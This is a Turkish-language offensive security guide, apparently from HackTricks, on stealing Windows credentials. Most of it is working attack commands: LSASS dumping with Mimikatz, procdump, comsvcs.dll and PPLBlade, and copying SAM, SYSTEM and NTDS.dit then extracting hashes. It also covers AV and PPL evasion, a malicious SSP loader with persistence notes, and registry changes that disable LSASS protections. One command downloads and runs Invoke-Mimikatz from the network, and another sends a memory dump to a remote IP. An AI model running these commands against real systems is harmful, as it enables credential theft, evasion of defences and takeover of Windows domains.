# Windows Credentials'i Çalma

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'in yapabileceği diğer şeyleri görmek için** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Bu korumalar Mimikatz'in bazı credentials'ları çıkarmasını engelleyebilir.**

## Credentials with Meterpreter

**Benim oluşturduğum** [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)'i kullanarak hedefin içinde **passwords ve hashes arayın**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV'yi Atlatma

### Procdump + Mimikatz

Çünkü **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**meşru bir Microsoft aracı olduğundan**, Defender tarafından tespit edilmiyor.\
Bu aracı kullanarak **dump the lsass process**, **download the dump** ve dump'tan **extract** **credentials locally** yapabilirsiniz.

Ayrıca [SharpDump](https://github.com/GhostPack/SharpDump) kullanabilirsiniz.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not:** Bazı **AV**'ler **procdump.exe to dump lsass.exe** kullanımını **malicious** olarak **detect** edebilir; bunun sebebi **"procdump.exe" and "lsass.exe"** dizelerini **detecting** etmeleridir. Bu yüzden lsass.exe'nin **name lsass.exe** yerine PID'sini procdump'a **argument** olarak **pass** etmek daha **stealthier** olur.

### Dumping lsass with **comsvcs.dll**

`C:\Windows\System32`'de bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **dumping process memory**'den sorumludur. Bu DLL, **`MiniDumpW`** adlı bir **function** içerir ve `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmıştır.\
İlk iki argümanın kullanılması önemsizdir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek işlem kimliği birinci bileşeni oluşturur, dump dosyası konumu ikinciyi temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Başka seçenek yoktur.\
Bu üç bileşen ayrıştırıldığında, DLL dump dosyasını oluşturur ve belirtilen işlemin belleğini bu dosyaya aktarır.\
**comsvcs.dll**'nin kullanılması lsass işlemini dump etmek için mümkündür; böylece procdump'ı yükleyip çalıştırmaya gerek kalmaz. Bu yöntem detaylı olarak şu adreste anlatılmıştır: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)

Çalıştırmak için aşağıdaki komut kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu işlemi otomatikleştirebilirsiniz** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Task Manager ile lsass dökümü**

1. Görev Çubuğuna sağ tıklayın ve Görev Yöneticisi'ne tıklayın
2. More details seçeneğine tıklayın
3. Processes sekmesinde "Local Security Authority Process" işlemini arayın
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Create dump file" seçeneğine tıklayın.

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft tarafından imzalanmış bir ikili dosyadır ve [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçasıdır.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass ile PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) disk üzerine yazmadan bellek dökümünü maskeleyip uzak iş istasyonlarına aktarabilen bir Protected Process Dumper aracıdır.

**Temel işlevler**:

1. Bypassing PPL protection
2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP tabanlı LSASS dökümü (MiniDumpWriteDump çağrısı olmadan)

Ink Dragon üç aşamalı bir dumper olan **LalsDumper**'ı gönderir; bu dumper hiçbir zaman `MiniDumpWriteDump` çağırmaz, bu yüzden o API üzerindeki EDR hook'ları tetiklenmez:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 adet küçük harf `d` karakterinden oluşan bir placeholder arar, bunu `rtu.txt`'ye mutlak yol ile yazar, yamalanmış DLL'i `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Bu, **LSASS**'ın kötü amaçlı DLL'i yeni bir Security Support Provider (SSP) olarak yüklemesini zorlar.
2. **Stage 2 inside LSASS** – LSASS `nfdp.dll`'yi yüklediğinde, DLL `rtu.txt`'yi okur, her baytı `0x20` ile XORlar ve yürütmeyi devretmeden önce dekode edilmiş bloğu belleğe mapler.
3. **Stage 3 dumper** – belleğe eşlenmiş payload, hashed API isimlerinden çözülen **direct syscalls** kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış bir LSASS dökümünü dosyaya yazar ve tutamağı kapatarak daha sonra exfiltration yapılmasına olanak sağlar.

Operator notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt`'yi aynı dizinde tutun. Stage 1, sabit kodlanmış placeholder'ı `rtu.txt`'nin mutlak yolu ile tekrar yazar; dosyaları ayırmak zinciri bozar.
* Kayıt, `nfdp` değerini `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`'a ekleyerek yapılır. LSASS'ın her açılışta SSP'yi yeniden yüklemesini sağlamak için bu değeri kendiniz set edebilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dökümlerdir. Yerelde dekompres edin, ardından credential extraction için Mimikatz/Volatility'e verin.
* `lals.exe` çalıştırmak için admin/SeTcb hakları gereklidir ki `AddSecurityPackageA` başarılı olsun; çağrı döndüğünde LSASS sahte SSP'yi şeffaf şekilde yükler ve Stage 2'yi yürütür.
* DLL'i diskten silmek, onu LSASS'tan çıkartmaz. ya registry kaydını silip LSASS'ı yeniden başlatın (reboot) ya da uzun vadeli persist için olduğu gibi bırakın.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets'i çıkarma
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit'i hedef DC'den
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Hedef DC'den NTDS.dit parola geçmişini dök
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM._ konumunda olmalıdır. Ancak **bunları normal bir şekilde kopyalayamazsınız** çünkü korunmaktadırlar.

### Kayıt Defterinden

Bu dosyaları ele geçirmenin en kolay yolu kayıt defterinden bir kopyasını almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
Bu dosyaları Kali makinenize **indirin** ve **hashes'i çıkarmak için** şu komutu kullanın:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu servisle korumalı dosyaların kopyasını alabilirsiniz. Administrator olmanız gerekir.

#### Using vssadmin

vssadmin binary yalnızca Windows Server sürümlerinde mevcuttur.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ama aynı işlemi **Powershell** ile de yapabilirsiniz. Bu, **SAM dosyasının nasıl kopyalanacağı**na dair bir örnektir (kullanılan sürücü "C:" ve kaydedildiği yer C:\users\Public) ama bunu herhangi bir korumalı dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kitaptan alınan kod: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Son olarak, [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) ile SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını alabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, **Active Directory**'nin kalbi olarak bilinir; kullanıcı nesneleri, gruplar ve üyelikleri hakkında kritik verileri barındırır. Etki alanı kullanıcılarının **password hashes**'lerinin depolandığı yerdir. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç ana tablo tutulur:

- **Data Table**: Bu tablo kullanıcılar ve gruplar gibi nesnelerin detaylarını depolamaktan sorumludur.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesne için **Security descriptors** burada tutulur; bu, saklanan nesnelerin güvenliğini ve erişim kontrolünü sağlar.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows bu dosyayla etkileşim için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Ayrıca **NTDS.dit** dosyasının bir kısmı **`lsass`** belleği içinde bulunabilir (muhtemelen performans için kullanılan bir **cache** nedeniyle en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'lerin çözülmesi

Hash üç kez şifrelenir:

1. Password Encryption Key (**PEK**) BOOTKEY ve **RC4** kullanılarak çözülür.
2. Hash PEK ve **RC4** kullanılarak çözülür.
3. Hash **DES** kullanılarak çözülür.

**PEK**, her domain controller'da **aynı değere** sahiptir, ancak domain controller'ün **SYSTEM** dosyasının **BOOTKEY**'i kullanılarak **NTDS.dit** içinde **şifrelenmiştir** (domain controller'lar arasında farklıdır). Bu yüzden NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM** dosyalarına ihtiyacınız vardır (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil kullanarak NTDS.dit kopyalama

Windows Server 2008'den beri kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ayrıca [**volume shadow copy**](#stealing-sam-and-system) yöntemini kullanarak **ntds.dit** dosyasını kopyalayabilirsiniz. Ayrıca **SYSTEM file**'ın bir kopyasına da ihtiyacınız olacağını unutmayın (tekrar, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) yöntemi).

### **NTDS.dit'den hashes çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettiğinizde** _secretsdump.py_ gibi araçları kullanarak **hashes'i çıkarabilirsiniz**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ayrıca geçerli bir domain admin user kullanarak bunları **otomatik olarak çıkarabilirsiniz:**
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Büyük NTDS.dit dosyaları için çıkarım yapmak üzere [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılması önerilir.

Son olarak, **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject` de kullanılabilir

### **NTDS.dit'den etki alanı nesnelerinin SQLite veritabanına çıkarılması**

NTDS nesneleri [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Sadece gizli bilgiler değil, aynı zamanda tüm nesneler ve öznitelikleri de çıkarılır; ham NTDS.dit dosyası zaten elde edildiğinde daha fazla bilgi çıkarmak için kullanılabilir.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive isteğe bağlıdır fakat sırların şifre çözülmesine olanak tanır (NT & LM hashes, açık metin parolalar gibi supplemental credentials, kerberos veya trust anahtarları, NT & LM parola geçmişleri). Diğer bilgilerle birlikte aşağıdaki veriler çıkarılır: kullanıcı ve makine hesapları ve hash'leri, UAC bayrakları, son oturum açma ve parola değişikliği zaman damgası, hesap açıklamaları, isimler, UPN, SPN, gruplar ve recursive üyelikler, organizational units ağacı ve üyelik, trusted domains ile trust türü, yön ve öznitelikler...

## Lazagne

İkiliyi [here](https://github.com/AlessandroZ/LaZagne/releases) adresinden indirin. Bu binary'yi çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## Diğer araçlar SAM ve LSASS'tan kimlik bilgileri çıkarmak için

### Windows credentials Editor (WCE)

Bu araç, bellekteki kimlik bilgilerini çıkarmak için kullanılabilir. İndirmek için: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarır
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

İndirmek için:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve sadece **çalıştırın**, parolalar çıkarılacaktır.

## Boşta bekleyen RDP oturumlarını keşfetme ve güvenlik kontrollerini zayıflatma

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Giden RDP hedefleri** – her kullanıcı hive'ini `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` altında ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint`'i ve son yazma zaman damgasını saklar. FinalDraft’ın mantığını PowerShell ile çoğaltabilirsiniz:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Gelen RDP kanıtı** – kimin sunucuyu yönettiğini haritalamak için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlüğünü Event ID'leri **21** (başarılı oturum açma) ve **25** (disconnect) için sorgulayın:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Hangi Domain Admin'in düzenli olarak bağlandığını öğrendikten sonra, onların **disconnected** oturumu hâlâ varken LSASS'i dump'layın (LalsDumper/Mimikatz ile). CredSSP + NTLM fallback, verifier ve token'larını LSASS içinde bırakır; bunlar daha sonra SMB/WinRM üzerinden replay edilerek `NTDS.dit` ele geçirilebilir veya domain controllers üzerinde persistence aşaması kurulabilir.

### Registry downgrades targeted by FinalDraft

Aynı implant ayrıca credential theft'i kolaylaştırmak için birkaç registry anahtarıyla da oynar:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` ayarı, RDP sırasında kimlik bilgileri ve biletlerin tamamen yeniden kullanılmasını zorlar; bu da pass-the-hash tarzı pivotlara imkan tanır.
* `LocalAccountTokenFilterPolicy=1` UAC token filtrelemesini devre dışı bırakır; böylece yerel yöneticiler ağ üzerinden kısıtlanmamış token alır.
* `DSRMAdminLogonBehavior=2` DSRM yöneticisinin DC çevrimiçi iken oturum açmasına izin verir; bu da saldırganlara başka bir yerleşik yüksek ayrıcalıklı hesap sağlar.
* `RunAsPPL=0` LSASS PPL korumalarını kaldırır; bu da LalsDumper gibi dump araçları için bellek erişimini kolaylaştırır.

## Referanslar

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
